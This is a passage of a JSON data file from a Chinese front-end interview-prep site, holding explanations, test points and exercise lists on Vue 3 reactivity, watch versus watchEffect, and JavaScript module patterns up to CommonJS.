会监视这个对象的所有属性，并收集相关依赖。当一个属性发生变化时，Proxy 会自动通知相关依赖进行更新，从而实现响应式的更新。\n\n举个例子，当一个 reactive 对象中的属性被修改时，会通过 Proxy 的 set 拦截器来通知相关依赖进行更新。具体实现代码如下：\n\n```js\nfunction reactive(target){\n    const handlers = {\n        get(target, key, receiver){\n            let result = Reflect.get(target, key, receiver)\n            return typeof result === 'object' ? reactive(result) : result\n        },\n        set(target, key, value, receiver){\n            let oldValue = target[key]\n            let result = Reflect.set(target, key, value, receiver)\n            if(result && oldValue != value) effect()\n            return result\n        }\n    }\n    return new Proxy(target, handlers)\n}\n\nlet product = reactive({price: 5, quantity: 2})\nlet total = 0\n\nconst effect = () => {\n    total = product.price * product.quantity\n}\n\neffect()\n\nconsole.log('before set: ', total)\nproduct.quantity = 3\nconsole.log('after set: ', total)\nconsole.log('quantity: ', product.quantity)\n```\n\n运行结果如下：\n\n![image.png](https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/1f4ec6ced9894297aa653934cc2f6737~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)\n\n从上面的例子可以看到，当对象的某个属性值被修改了，set 拦截器监听到赋值操作，并对比新旧值是否一样，当值不一致时，会触发effec方法，这里的effect可以理解为更新视图的方法，它产生的作用就像vue中computed。\n\n但上面的例子中可能有两个问题：\n\n1.  类似的effect方法可能有多个，就是针对于上面对象product的属性price影响到的页面节点可能有多个，我们平时开发的时候，可能会定义多个computed属性、watch方法。如果price属性的值被修改了，那么就需要去触发与其相关的影响effect，这时就需要有一个回调方法的集合去存储这些影响effect。\n\n```js\nconst depsMap = new Map()\n\nfunction track(key){\n    let dep = depsMap.get(key)\n    if(!dep){\n        depsMap.set(key, (dep = new Set()))\n    }\n    \n    dep.add(effect)\n}\n\nfunction trigger(key){\n    let dep = depsMap.get(key)\n    if(dep){\n        dep.forEach(effect => {\n            effect()\n        })\n    }\n}\n\nlet product = { price: 5, quantity: 2 }\nlet total = 0\nlet effect = () => {\n    total = product.price * product.quantity\n}\n\ntrack('quantity')\neffect()  // total = 10\nproduct.quantity = 3\ntrigger('quantity')\nconsole.log(total)  // total = 15\n```\n\n我们定义一个map集合，对象属性作为key，value是set集合，存储对象属性所有的回调方法，当对象属性值被修改时，会调用trigger方法获取属性对应的回调方法集合，循环执行。\n\n2.  在平时的开发过程中，我们肯定有多个对象加入到响应式中，这时就需要一个集合去存储多个对象的响应式回调方法集合。\n\n![image.png](https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/0b20757194a94f0db90ed3d57c9c0876~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp?)\n\n这里我们使用了一个WeakMap集合，对象作为key，depsMap作为value，存储多个对象的响应式回调方法。\n\n> WeakMap是一个键值对的集合，键必须为一个对象，值是任意的，而且键是弱引用，如果没有存在其他引用的情况下，是可以正常地进行垃圾回收，这对内存的使用非常友好，自然而然地性能也提升上去，因此WeakMap正好适用于我们上面的使用场景。\n\n最终的代码如下：\n\n```js\nconst targetMap = new WeakMap()\n\nfunction track(target, key){\n    let depsMap = targetMap.get(target)\n    if(!depsMap){\n        targetMap.set(target, (depsMap = new Map()))\n    }\n\n    let dep = depsMap.get(key)\n    if(!dep){\n        depsMap.set(key, (dep = new Set()))\n    }\n\n    dep.add(effect)\n}\n\nfunction trigger(target, key){\n    const depsMap = targetMap.get(target)\n    if(!depsMap) return\n\n    let dep = depsMap.get(key)\n    if(dep){\n        dep.forEach(effect => {\n            effect()\n        }) \n    }\n}\n\nfunction reactive(target){\n    const handlers = {\n        get(target, key, receiver){\n            let result = Reflect.get(target, key, receiver)\n            track(target, key)\n            return result\n        },\n        set(target, key, value, receiver){\n            let oldValue = target[key]\n            let result = Reflect.set(target, key, value, receiver)\n            if(result && oldValue != value){\n                trigger(target, key)\n            }\n            return result\n        }\n    }\n\n    return new Proxy(target, handlers)\n}\n\nlet product = reactive({price: 5, quantity: 2})\nlet total = 0\n\nconst effect = () => {\n    total = product.price * product.quantity\n}\n\neffect()\n\nconsole.log('before set: ', total)\nproduct.quantity = 3\nconsole.log('after set: ', total)\nconsole.log('quantity: ', product.quantity)\n```\n\n## 总结\n\n在 Vue3 中，响应式系统的实现方式使用了 ES6 Proxy 对象来拦截数据对象的访问操作，避免了 Vue2 中 Object.defineProperty 无法监听数组变化等问题，使得响应式数据更新更加高效、可预测和易维护。\n\n同时，Vue3 的依赖收集机制也进行了一定的优化，使用基于函数的依赖收集提高了系统的性能，同时也使得开发人员可以更方便地跟踪和定位问题。\n\n最后，Vue3 在响应式原理的改进和优化为我们提供了更加高效、可靠和强大的开发体验。",
    "testPoint": "### **1. 响应式实现原理**\n- **Vue 2：`Object.defineProperty`**\n  - 如何通过 `Object.defineProperty` 劫持对象的属性？\n  - 为什么 Vue 2 中的响应式不能监控数组索引和对象新增/删除属性？\n  - Vue 2 是如何进行依赖收集和视图更新的？\n  - Vue 2 中，`setter` 和 `getter` 是如何工作的？\n\n- **Vue 3：`Proxy`**\n  - 为什么 Vue 3 使用 `Proxy` 代替了 `Object.defineProperty`？\n  - `Proxy` 如何处理对象的所有操作（包括新增属性、删除属性等）？\n  - Vue 3 中，`get` 和 `set` 方法如何拦截数据的读写？\n  - `Proxy` 如何避免了 Vue 2 中的深度递归问题？\n  - 通过 `Proxy` 实现的懒加载和高效的依赖追踪。\n\n---\n\n### **2. 数据代理与依赖收集**\n- **依赖收集**：\n  - Vue 如何实现依赖收集？`Watcher` 和 `Dep` 的角色是什么？\n  - 在 Vue 3 中，如何通过 `Effect` 函数收集依赖？\n  - 依赖收集与视图更新是如何相互作用的？\n  - Vue 如何跟踪每个组件或视图对响应式数据的依赖？\n  \n- **视图更新**：\n  - 当响应式数据发生变化时，Vue 是如何通知依赖于它的视图进行更新的？\n  - Vue 3 中如何通过 `Proxy` 来通知依赖的更新，而不需要手动触发 `set`？\n\n---\n\n### **3. 响应式数据的种类**\n- **`reactive()` 和 `ref()`**：\n  - `reactive()` 是如何让对象变得响应式的？与 `ref()` 有什么区别？\n  - `ref()` 返回的是一个对象，为什么需要 `.value` 属性来访问和修改其值？\n  - 如何在 Vue 3 中处理基本数据类型（例如字符串、数字、布尔值）的响应式？\n  - 如何通过 `reactive()` 和 `ref()` 组合使用来处理复杂的数据结构？\n\n- **对象和数组的响应式**：\n  - Vue 3 如何解决 Vue 2 中数组索引和对象新增/删除属性无法响应式更新的问题？\n  - 在 Vue 3 中，如何处理嵌套对象的响应式？`Proxy` 是如何递归地处理嵌套对象的？\n\n---\n\n### **4. Vue 3 响应式的性能优化**\n- **懒加载和优化**：\n  - Vue 3 如何优化性能，特别是在处理嵌套对象时？为什么 `Proxy` 相比 `Object.defineProperty` 更高效？\n  - 如何通过懒加载来减少不必要的依赖收集？\n  - 在 Vue 3 中，依赖追踪是如何更加高效的，避免了 Vue 2 中的性能瓶颈？\n\n- **优化的目标**：\n  - 为什么 Vue 3 能够比 Vue 2 更高效地处理大规模的数据和复杂的组件树？\n  - `Proxy` 如何支持惰性计算和按需收集依赖？\n\n---\n\n### **5. Vue 2 和 Vue 3 的响应式差异**\n- **响应式系统的差异**：\n  - Vue 2 和 Vue 3 的响应式系统有何本质区别？\n  - 为什么 Vue 3 的响应式系统相较 Vue 2 更加强大和灵活？\n  - `Proxy` 如何解决 Vue 2 中的一些限制（如不能响应数组索引、对象新增/删除属性等）？\n  \n- **性能差异**：\n  - 在处理深度嵌套的数据结构时，Vue 2 和 Vue 3 的性能差异。\n  - Vue 3 如何避免了 Vue 2 中的递归性能问题？\n  - Vue 3 是如何提高响应式系统在高频更新场景下的性能的？\n\n---\n\n### **6. 响应式的局限性与陷阱**\n- **Vue 2 的局限性**：\n  - Vue 2 为什么无法监测数组索引的变化？\n  - Vue 2 如何使用 `$set` 和 `$delete` 来处理新增和删除属性的问题？\n  - Vue 2 的响应式系统是否存在性能瓶颈，如何优化？\n\n- **Vue 3 的陷阱**：\n  - Vue 3 中是否仍有需要注意的响应式陷阱？\n  - 如果手动修改对象的 `__proto__`，Vue 3 是否仍然能监测到这些变化？\n\n---\n\n### **7. 响应式的使用场景**\n- **Vue 3 的 `watch` 和 `computed`**：\n  - 如何利用 `watch` 和 `computed` 对响应式数据进行监听与派发操作？\n  - Vue 3 中，`computed` 和 `watch` 的工作原理是什么？与 Vue 2 有什么不同？\n\n- **嵌套对象与数组的处理**：\n  - 如何在 Vue 3 中创建一个包含嵌套对象或数组的响应式数据，并确保其变化会反映到视图？\n  - 何时选择使用 `reactive()` 还是 `ref()` 来创建响应式数据？\n\n---\n\n### **8. Vue 3 中的其他相关特性**\n- **`readonly()` 和 `shallowReactive()`**：\n  - `readonly()` 是如何限制数据修改的？它是如何影响响应式系统的？\n  - `shallowReactive()` 是什么？如何使用它避免对嵌套对象的深度代理？\n\n- **`toRefs()` 和 `toRaw()`**：\n  - `toRefs()` 如何将响应式对象转换为普通的引用，方便解构？\n  - `toRaw()` 是如何返回原始对象的？何时使用 `toRaw()`？",
    "exerciseKeyList": "[\"2724b7d8-c161-4106-9c54-956d14b4b1b0\",\"263e22e5-d2ea-4a3d-bd3a-5b35678c06ee\",\"5680ca8b-077f-445e-b38c-ac64356163c7\",\"cd026df0-0b62-47dc-93e3-c30a1c3d8ab5\",\"c578d161-5468-4577-90c2-98e46cb82604\",\"ea676360-c8f5-4ce4-bc66-5c3e4f7eddb6\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-05T08:52:15.000Z",
    "updateAt": "2024-12-18T02:07:10.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "263e22e5-d2ea-4a3d-bd3a-5b35678c06ee",
        "title": "Vue 2 的响应式原理中 Object.defineProperty 有什么缺陷",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:57:08.000Z"
      },
      {
        "exerciseKey": "2724b7d8-c161-4106-9c54-956d14b4b1b0",
        "title": "Vue 的响应式数据流驱动页面和传统的事件绑定命令式驱动页面，分别有什么优缺点？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:18:48.000Z"
      },
      {
        "exerciseKey": "5680ca8b-077f-445e-b38c-ac64356163c7",
        "title": "vue3 的响应式库是独立出来的，如果单独使用是什么样的效果？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-15T14:07:34.000Z"
      },
      {
        "exerciseKey": "c578d161-5468-4577-90c2-98e46cb82604",
        "title": "vue 的响应式开发比命令式有哪些优势？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-31T01:13:05.000Z",
        "updateAt": "2024-08-10T17:07:27.000Z"
      },
      {
        "exerciseKey": "cd026df0-0b62-47dc-93e3-c30a1c3d8ab5",
        "title": "Vue 有了数据响应式，为何还要 diff ？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-06-06T01:41:34.000Z",
        "updateAt": "2024-08-10T19:54:43.000Z"
      },
      {
        "exerciseKey": "ea676360-c8f5-4ce4-bc66-5c3e4f7eddb6",
        "title": "说说 vue3 中的响应式设计原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-10T02:06:40.000Z",
        "updateAt": "2024-08-10T17:06:29.000Z"
      }
    ]
  },
  "107": {
    "id": 107,
    "tagId": 14,
    "title": " watch与watchEffect",
    "explanation": "## Watch\n\n### 基本用法\n\n当我们需要在数据变化时执行一些“副作用”：如更改 DOM、执行异步操作，我们可以使用 `watch` 函数：\n\n```xml\n<script setup>\nimport { ref, watch } from 'vue'\n\nconst question = ref('')\nconst answer = ref('This is answer. ;-)')\n\n// 侦听一个 ref\nwatch(question, async (newQuestion, oldQuestion) => {\n  answer.value = 'Thinking...'\n  const res = await fetch('https://...')\n  answer.value = (await res.json()).answer\n})\n</script>\n\n<template>\n  <input v-model=\"question\" />\n  <p>{{ answer }}</p>\n</template>\n```\n\n`watch()` 一共可以接受三个参数，侦听数据源、回调函数和配置选项。\n\n### 侦听数据源\n\n`watch` 的第一个参数可以是不同形式的“数据源”，它可以是：\n\n-   一个 ref\n-   一个计算属性\n-   一个 getter 函数（有返回值的函数）\n-   一个响应式对象\n-   以上类型的值组成的数组\n\n```javascript\nconst x = ref(1)\nconst y = ref(1)\nconst doubleX = computed(() => x.value * 2)\nconst obj = reactive({ count: 0 })\n\n// 单个 ref\nwatch(x, (newValue) => {\n  console.log(`x is ${newValue}`)\n})\n\n// 计算属性\nwatch(doubleX, (newValue) => {\n  console.log(`doubleX is ${newValue}`)\n})\n\n// getter 函数\nwatch(\n  () => x.value + y.value,\n  (sum) => {\n    console.log(`sum of x + y is: ${sum}`)\n  }\n)\n\n// 响应式对象\nwatch(obj, (newValue, oldValue) => {\n  // 在嵌套的属性变更时触发\n  // 注意：`newValue` 此处和 `oldValue` 是相等的\n  // 因为它们是同一个对象！\n})\n\n// 以上类型的值组成的数组\nwatch([x, () => y.value], ([newX, newY]) => {\n  console.log(`x is ${newX} and y is ${newY}`)\n})\n```\n\n注意，你不能直接侦听响应式对象的属性值，例如:\n\n```javascript\nconst obj = reactive({ count: 0 })\n\n// 错误，因为 watch() 得到的参数是一个 number\nwatch(obj.count, (count) => {\n  console.log(`count is: ${count}`)\n})\n```\n\n这里需要用一个返回该属性的 getter 函数：\n\n```javascript\n// 提供一个 getter 函数\nwatch(\n  () => obj.count,\n  (count) => {\n    console.log(`count is: ${count}`)\n  }\n)\n```\n\n### 回调函数\n\n`watch` 的第二个参数是数据发生变化时执行的回调函数。\n\n这个回调函数接受三个参数：新值、旧值，以及一个用于清理副作用的回调函数。该回调函数会在副作用下一次执行前调用，可以用来清除无效的副作用，如等待中的异步请求：\n\n```js\nconst id = ref(1)\nconst data = ref(null)\n\nwatch(id, async (newValue, oldValue, onCleanup) => {\n  const { response, cancel } = doAsyncWork(id.value)\n  // `cancel` 会在 `id` 更改时调用\n  // 以便取消之前未完成的请求\n  onCleanup(cancel)\n  data.value = await response.json()\n})\n```\n\n`watch` 的返回值是一个用来停止该副作用的函数：\n\n```js\nconst unwatch = watch(() => {})\n\n// ...当该侦听器不再需要时\nunwatch()\n```\n\n注意：使用同步语句创建的侦听器，会自动绑定到宿主组件实例上，并且会在宿主组件卸载时自动停止。使用异步回调创建一个侦听器，则不会绑定到当前组件上，你必须手动停止它，以防内存泄漏。如下面这个例子：\n\n```xml\n<script setup>\nimport { watchEffect } from 'vue'\n\n// 组件卸载会自动停止\nwatchEffect(() => {})\n\n// 组件卸载不会停止！\nsetTimeout(() => {\n  watchEffect(() => {})\n}, 100)\n</script>\n```\n\n### 配置选项\n\n`watch` 的第三个参数是一个可选的对象，支持以下选项：\n\n-   `immediate`：在侦听器创建时立即触发回调。\n-   `deep`：深度遍历，以便在深层级变更时触发回调。\n-   `flush`：回调函数的触发时机。pre：默认，dom 更新前调用，post: dom 更新后调用，sync 同步调用。\n-   `onTrack / onTrigger`：用于调试的钩子。在依赖收集和回调函数触发时被调用。\n\n### 深层侦听器\n\n直接给 `watch()` 传入一个响应式对象，会默认创建一个深层侦听器 —— 所有嵌套的属性变更时都会被触发：\n\n```scss\nconst obj = reactive({ count: 0 })\n\nwatch(obj, (newValue, oldValue) => {\n  // 在嵌套的属性变更时触发\n  // 注意：`newValue` 此处和 `oldValue` 是相等的\n  // 因为它们是同一个对象！\n})\n\nobj.count++\n```\n\n相比之下，一个返回响应式对象的 getter 函数，只有在对象被替换时才会触发：\n\n```php\nconst obj = reactive({\n  someString: 'hello',\n  someObject: { count: 0 }\n})\n\nwatch(\n  () => obj.someObject,\n  () => {\n    // 仅当 obj.someObject 被替换时触发\n  }\n)\n```\n\n当然，你也可以显式地加上 `deep` 选项，强制转成深层侦听器：\n\n```javascript\nwatch(\n  () => obj.someObject,\n  (newValue, oldValue) => {\n    // `newValue` 此处和 `oldValue` 是相等的\n    // 除非 obj.someObject 被整个替换了\n    console.log('deep', newValue.count, oldValue.count)\n  },\n  { deep: true }\n)\n\nobj.someObject.count++ // deep 1 1\n```\n\n深层侦听一个响应式对象或数组，新值和旧值是相等的。为了解决这个问题，我们可以对值进行深拷贝。\n\n```javascript\nwatch(\n  () => _.cloneDeep(obj.someObject),\n  (newValue, oldValue) => {\n    // 此时 `newValue` 此处和 `oldValue` 是不相等的\n    console.log('deep', newValue.count, oldValue.count)\n  },\n  { deep: true }\n)\n\nobj.someObject.count++ // deep 1 0\n```\n\n注意：深层侦听需要遍历所有嵌套的属性，当数据结构庞大时，开销很大。所以我们要谨慎使用，并且留意性能。\n\n## watchEffect\n\n`watch()` 是懒执行的：当数据源发生变化时，才会执行回调。但在某些场景中，我们希望在创建侦听器时，立即执行一遍回调。当然使用 `immediate` 选项也能实现：\n\n```csharp\nconst url = ref('https://...')\nconst data = ref(null)\n\nasync function fetchData() {\n  const response = await fetch(url.value)\n  data.value = await response.json()\n}\n\n// 立即执行一次，再侦听 url 变化\nwatch(url, fetchData, { immediate: true })\n```\n\n可以看到 `watch` 用到了三个参数，我们可以用 `watchEffect` 来简化上面的代码。`watchEffect` 会立即执行一遍回调函数，如果这时函数产生了副作用，Vue 会自动追踪副作用的依赖关系，自动分析出侦听数据源。上面的例子可以重写为：\n\n```js\nconst url = ref('https://...')\nconst data = ref(null)\n\n// 一个参数就可以搞定\nwatchEffect(async () => {\n  const response = await fetch(url.value)\n  data.value = await response.json()\n})\n```\n\n`watchEffect` 接受两个参数，第一个参数是数据发生变化时执行的回调函数，用法和 `watch` 一样。第二个参数是一个可选的对象，支持 `flush` 和 `onTrack / onTrigger` 选项，功能和 `watch` 相同。\n\n注意：`watchEffect` 仅会在其同步执行期间，才追踪依赖。使用异步回调时，只有在第一个 `await` 之前访问到的依赖才会被追踪。\n\n## `watch` vs. `watchEffect`\n\n`watch` 和 `watchEffect` 的主要功能是相同的，都能响应式地执行回调函数。它们的区别是追踪响应式依赖的方式不同：\n\n-   `watch` 只追踪明确定义的数据源，不会追踪在回调中访问到的东西；默认情况下，只有在数据源发生改变时才会触发回调；`watch` 可以访问侦听数据的新值和旧值。\n-   `watchEffect` 会初始化执行一次，在副作用发生期间追踪依赖，自动分析出侦听数据源；`watchEffect` 无法访问侦听数据的新值和旧值。\n\n简单一句话，`watch` 功能更加强大，而 `watchEffect` 在某些场景下更加简洁。",
    "testPoint": "### **1. `watch` 的考察点**\n\n#### **1.1 监听特定数据**\n- **基本用法**：`watch` 用于观察一个特定的数据源（如 `ref`、`reactive` 或计算属性）的变化，并在数据变化时执行回调。\n  - **考察点**：候选人需要理解如何使用 `watch` 来观察数据的变化，并根据新旧值执行副作用。\n  - **示例问题**：如何使用 `watch` 监听一个对象的某个属性变化并执行回调？在什么时候使用 `watch` 而不是 `watchEffect`？\n\n#### **1.2 新旧值**\n- **提供新旧值**：`watch` 在回调函数中会传入新值和旧值，帮助你处理数据变化。\n  - **考察点**：候选人需要理解如何获取 `watch` 的新旧值，以及如何根据这些值执行副作用。\n  - **示例问题**：如何在 `watch` 回调中获取旧值和新值？如何基于这些值进行条件判断或操作？\n\n#### **1.3 `immediate` 选项**\n- **立即执行**：`watch` 可以通过 `immediate` 选项设置在观察开始时立即执行回调。\n  - **考察点**：候选人应该了解 `immediate` 的作用，以及何时需要立即执行回调而非等待数据变化。\n  - **示例问题**：如何使用 `watch` 的 `immediate` 选项？什么时候会用到它？\n\n#### **1.4 停止监听**\n- **返回停止监听的函数**：`watch` 返回一个停止监听的函数，允许在需要时手动停止观察。\n  - **考察点**：候选人应该知道如何在组件卸载或其他特定场景下停止监听。\n  - **示例问题**：如何在组件销毁时清理 `watch` 的副作用？\n\n#### **1.5 深度监听**\n- **深度监听**：`watch` 支持 `deep` 选项，可以监听对象的嵌套属性。\n  - **考察点**：候选人需要理解如何使用 `deep` 选项来深度监听对象变化，并可能需要讨论其性能开销。\n  - **示例问题**：如何通过 `deep` 选项监听对象的嵌套变化？在什么情况下你会用到深度监听？\n\n---\n\n### **2. `watchEffect` 的考察点**\n\n#### **2.1 自动追踪依赖**\n- **自动依赖追踪**：`watchEffect` 会自动追踪内部使用的响应式数据，而不需要显式地声明要观察哪些数据。\n  - **考察点**：候选人需要理解 `watchEffect` 如何自动追踪依赖，并且无需手动指定监听哪些数据。\n  - **示例问题**：`watchEffect` 是如何自动追踪依赖的？它与 `watch` 有何区别？\n\n#### **2.2 惰性执行**\n- **惰性执行**：`watchEffect` 在初次执行时会立即运行一次，然后在依赖发生变化时自动重新执行。\n  - **考察点**：候选人需要理解 `watchEffect` 的执行顺序及其惰性执行特性。\n  - **示例问题**：`watchEffect` 的回调函数第一次会被执行吗？如果某个数据改变，回调函数是如何重新执行的？\n\n#### **2.3 不提供新旧值**\n- **没有新旧值**：与 `watch` 不同，`watchEffect` 不提供新旧值，回调函数只能通过内部的依赖自动更新。\n  - **考察点**：候选人需要理解为什么 `watchEffect` 不提供新旧值，以及如何在没有新旧值的情况下实现副作用。\n  - **示例问题**：`watchEffect` 中无法获取新旧值，如何处理这种情况？\n\n#### **2.4 对象依赖的自动清除**\n- **自动清除副作用**：`watchEffect` 会在依赖发生变化时重新执行回调，并清理之前的副作用。\n  - **考察点**：候选人需要理解 `watchEffect` 如何自动清除和重新执行副作用，避免内存泄漏或无效的副作用执行。\n  - **示例问题**：`watchEffect` 是如何清除之前的副作用并重新执行回调的？\n\n#### **2.5 不需要显式传入依赖**\n- **不需要手动指定依赖**：`watchEffect` 会自动追踪代码中访问的所有响应式数据。\n  - **考察点**：候选人需要理解 `watchEffect` 如何处理依赖自动追踪，以及与 `watch` 的区别。\n  - **示例问题**：`watchEffect` 会自动追踪哪些数据变化？它与 `watch` 的依赖指定方式有何不同？\n\n---\n\n### **3. `watch` 和 `watchEffect` 的区别**\n\n#### **3.1 触发机制**\n- **`watch`**：当指定的响应式数据变化时，触发回调函数，并且提供新旧值。\n- **`watchEffect`**：会自动追踪回调中的依赖，任何被访问到的响应式数据发生变化时，回调函数都会重新执行。\n\n#### **3.2 依赖管理**\n- **`watch`**：需要显式指定要观察的响应式数据或表达式。\n- **`watchEffect`**：不需要显式指定依赖，它会自动追踪回调中访问的所有响应式数据。\n\n#### **3.3 适用场景**\n- **`watch`**：适用于需要监听特定数据变化，并需要新旧值进行处理的场景。\n- **`watchEffect`**：适用于副作用逻辑简单，并且不需要新旧值的场景。\n\n#### **3.4 性能**\n- **`watch`**：能够对特定的数据变化进行精确控制，性能通常较优。\n- **`watchEffect`**：由于自动依赖追踪，它会依赖于回调函数中所有访问的响应式数据，可能导致更多的不必要的副作用执行。\n\n#### **示例问题**：\n- 你会如何选择使用 `watch` 还是 `watchEffect` 来监听数据变化？分别在什么情况下更适合使用？\n- `watchEffect` 如何自动追踪依赖？它与 `watch` 的区别是什么？\n- `watch` 的 `immediate` 选项如何使用？有什么实际场景？\n\n---\n\n`watch` 和 `watchEffect` 在 Vue 3 中的主要区别在于它们如何管理和追踪依赖。`watch` 适用于需要精确监听特定数据变化并获取新旧值的场景，而 `watchEffect` 适合用来自动追踪所有依赖并在数据变化时自动执行副作用。面试时，通过提问这些考察点，面试官可以评估候选人对 Vue 响应式系统的理解、两者的区别以及它们的使用场景。",
    "exerciseKeyList": "[\"a75d5604-a4f4-410b-9ec9-f5f5f90de35e\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T08:58:22.000Z",
    "updateAt": "2024-12-25T01:12:36.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "a75d5604-a4f4-410b-9ec9-f5f5f90de35e",
        "title": "watch与watchEffect 有什么区别，分别在什么场景下使用？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-12-25T01:11:04.000Z",
        "updateAt": "2024-12-25T01:11:10.000Z"
      }
    ]
  },
  "108": {
    "id": 108,
    "tagId": 28,
    "title": "前端模块化",
    "explanation": "## 一、模块化的理解\n\n### 1.什么是模块?\n\n+   将一个复杂的程序依据一定的规则(规范)封装成几个块(文件), 并进行组合在一起\n+   块的内部数据与实现是私有的, 只是向外部暴露一些接口(方法)与外部其它模块通信\n\n### 2.模块化的进化过程\n\n+   **全局function模式 : 将不同的功能封装成不同的全局函数**\n    +   编码: 将不同的功能封装成不同的全局函数\n    +   问题: 污染全局命名空间, 容易引起命名冲突或数据不安全，而且模块成员之间看不出直接关系\n\n```js\nfunction m1(){\n  //...\n}\nfunction m2(){\n  //...\n}\n```\n\n+   **namespace模式 : 简单对象封装**\n    +   作用: 减少了全局变量，解决命名冲突\n    +   问题: 数据不安全(外部可以直接修改模块内部的数据)\n\n```js\nlet myModule = {\n  data: 'www.baidu.com',\n  foo() {\n    console.log(`foo() ${this.data}`)\n  },\n  bar() {\n    console.log(`bar() ${this.data}`)\n  }\n}\nmyModule.data = 'other data' //能直接修改模块内部的数据\nmyModule.foo() // foo() other data\n```\n\n这样的写法会暴露所有模块成员，内部状态可以被外部改写。\n\n+   **IIFE模式：匿名函数自调用(闭包)**\n    +   作用: 数据是私有的, 外部只能通过暴露的方法操作\n    +   编码: 将数据和行为封装到一个函数内部, 通过给window添加属性来向外暴露接口\n    +   问题: 如果当前这个模块依赖另一个模块怎么办?\n\n```html\n// index.html文件\n<script type=\"text/javascript\" src=\"module.js\"></script>\n<script type=\"text/javascript\">\n    myModule.foo()\n    myModule.bar()\n    console.log(myModule.data) //undefined 不能访问模块内部数据\n    myModule.data = 'xxxx' //不是修改的模块内部的data\n    myModule.foo() //没有改变\n</script>\n```\n\n```js\n// module.js文件\n(function(window) {\n  let data = 'www.baidu.com'\n  //操作数据的函数\n  function foo() {\n    //用于暴露有函数\n    console.log(`foo() ${data}`)\n  }\n  function bar() {\n    //用于暴露有函数\n    console.log(`bar() ${data}`)\n    otherFun() //内部调用\n  }\n  function otherFun() {\n    //内部私有的函数\n    console.log('otherFun()')\n  }\n  //暴露行为\n  window.myModule = { foo, bar } //ES6写法\n})(window)\n```\n\n最后得到的结果：\n\n![](https://static.ecool.fun//article/c2524638-a7d5-4ff2-a13d-f952d7cc3ce2.awebp)\n\n+   **IIFE模式增强 : 引入依赖**\n\n这就是现代模块实现的基石\n\n```js\n// module.js文件\n(function(window, $) {\n  let data = 'www.baidu.com'\n  //操作数据的函数\n  function foo() {\n    //用于暴露有函数\n    console.log(`foo() ${data}`)\n    $('body').css('background', 'red')\n  }\n  function bar() {\n    //用于暴露有函数\n    console.log(`bar() ${data}`)\n    otherFun() //内部调用\n  }\n  function otherFun() {\n    //内部私有的函数\n    console.log('otherFun()')\n  }\n  //暴露行为\n  window.myModule = { foo, bar }\n})(window, jQuery)\n```\n\n```html\n // index.html文件\n  <!-- 引入的js必须有一定顺序 -->\n  <script type=\"text/javascript\" src=\"jquery-1.10.1.js\"></script>\n  <script type=\"text/javascript\" src=\"module.js\"></script>\n  <script type=\"text/javascript\">\n    myModule.foo()\n  </script>\n```\n\n上例子通过jquery方法将页面的背景颜色改成红色，所以必须先引入jQuery库，就把这个库当作参数传入。**这样做除了保证模块的独立性，还使得模块之间的依赖关系变得明显**。\n\n### 3\\. 模块化的好处\n\n+   避免命名冲突(减少命名空间污染)\n+   更好的分离, 按需加载\n+   更高复用性\n+   高可维护性\n\n### 4\\. 引入多个`<script>`后出现出现问题\n\n+   请求过多\n\n首先我们要依赖多个模块，那样就会发送多个请求，导致请求过多\n\n+   依赖模糊\n\n我们不知道他们的具体依赖关系是什么，也就是说很容易因为不了解他们之间的依赖关系导致加载先后顺序出错。\n\n+   难以维护\n\n以上两种原因就导致了很难维护，很可能出现牵一发而动全身的情况导致项目出现严重的问题。 模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上这些问题。而这些问题可以通过模块化规范来解决，下面介绍开发中最流行的commonjs, AMD, ES6, CMD规范。\n\n## 二、模块化规范\n\n### 1.CommonJS\n\n#### (1)概述\n\nNode 应用由模块组成，采用 CommonJS 模块规范。每个文件就是一个模块，有自己的作用域。在一个文件里面定义的变量、函数、类，都是私有的，对其他文件不可见。**在服务器端，模块的加载是运行时同步加载的；在浏览器端，模块需要提前编译打包处理。**\n\n#### (2)特点\n\n+   所有代码都运行在模块作用域，不会污染全局作用域。\n+   模块可以多次加载，但是只会在第一次加载时运行一次，然后运行结果就被缓存了，以后再加载，就直接读取缓存结果。要想让模块再次运行，必须清除缓存。\n+   模块加载的顺序，按照其在代码中出现的顺序。\n\n#### (3)基本语法\n\n+   暴露模块：`module.exports = value`或`exports.xxx = value`\n+   引入模块：`require(xxx)`,如果是第三方模块，xxx为模块名；如果是自定义模块，xxx为模块文件路径\n\n此处我们有个疑问：**CommonJS暴露的模块到底是什么?** CommonJS规范规定，每个模块内部，module变量代表当前模块。这个变量是一个对象，它的exports属性（即module.exports）是对外的接口。**加载某个模块，其实是加载该模块的module.exports属性**。\n\n```js\n// example.js\nvar x = 5;\nvar addX = function (value) {\n  return value + x;\n};\nmodule.exports.x = x;\nmodule.exports.addX = addX;\n```\n\n上面代码通过module.exports输出变量x和函数addX。\n\n```js\nvar example = require('./example.js');//如果参数字符串以“./”开头，则表示加载的是一个位于相对路径\nconsole.log(example.x); // 5\nconsole.log(example.addX(1)); // 6\n```\n\nrequire命令用于加载模块文件。**require命令的基本功能是，读入并执行一个JavaScript文件，然后返回该模块的exports对象。如果没有发现指定模块，会报错**。\n\n#### (4)模块的加载机制\n\n**CommonJS模块的加载机制是，输入的是被输出的值的拷贝。也就是说，一旦输出一个值，模块内部的变化就影响不到这个值**。这点与ES6模块化有重大差异（下文会介绍），请看下面这个例子：\n\n```js\n// lib.js\nvar counter = 